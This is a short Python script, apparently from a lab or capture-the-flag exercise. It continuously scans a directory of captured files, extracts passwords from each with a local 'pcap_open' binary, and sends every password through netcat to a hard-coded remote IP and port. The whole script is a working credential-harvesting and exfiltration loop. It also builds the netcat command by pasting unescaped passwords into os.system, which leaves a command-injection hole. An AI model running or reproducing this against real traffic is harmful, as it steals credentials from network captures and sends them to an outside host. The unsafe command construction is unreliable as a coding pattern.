from __future__ import print_function
import os
import subprocess 
import time
import sys


def send_passwords(to_send):
    for e_pass in to_send:
        the_return = os.system('echo \"' + e_pass + '\" 128.114.59.29 45923 | nc 128.114.59.42 2001')
        time.sleep(0.1)
        if the_return == 0:
            print("Password: " + e_pass)
        else:
            print("Dan you are FUCKING LOSING IT")
            print(the_return)

def continous_password_gen(data_dir):
    already_sent = []
    while True:
        temp = []
        lisdir = os.listdir(data_dir)
        for i in lisdir:
            if i not in already_sent:
                already_sent.append(i)
                encrypted_pass = subprocess.check_output(['./bin/pcap_open', '-u', data_dir+i])
                temp.append(encrypted_pass)

        send_passwords(temp)
        time.sleep(5)


if __name__ == '__main__':
    print("executing as a scrpt not a lib")
    continous_password_gen("data/P2/T4/")